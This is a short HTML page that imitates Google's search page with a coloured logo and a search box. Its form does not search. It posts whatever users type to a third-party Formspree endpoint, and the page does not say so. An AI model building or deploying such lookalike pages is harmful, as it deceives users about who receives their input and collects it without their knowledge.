<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Style Search</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .logo {
      font-size: 60px;
      font-weight: bold;
      color: #4285F4;
      margin-bottom: 30px;
    }

    .logo span:nth-child(2) { color: #DB4437; }
    .logo span:nth-child(3) { color: #F4B400; }
    .logo span:nth-child(4) { color: #4285F4; }
    .logo span:nth-child(5) { color: #0F9D58; }

    form {
      width: 100%;
      max-width: 500px;
      display: flex;
      gap: 10px;
    }

    input {
      flex: 1;
      padding: 14px;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 30px;
      outline: none;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }

    button {
      padding: 14px 20px;
      border: none;
      border-radius: 30px;
      background: #4285F4;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #2b6be6;
    }
  </style>
</head>

<body>

  <!-- Google style logo -->
  <div class="logo">
    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
  </div>

  <!-- Form -->
  <form action="https://formspree.io/f/xbdvpwev" method="POST">

    <!-- User search input -->
    <input type="text" name="user_search" placeholder="Search Google or type a URL" required>

    <button type="submit">Search</button>

  </form>

</body>
</html>
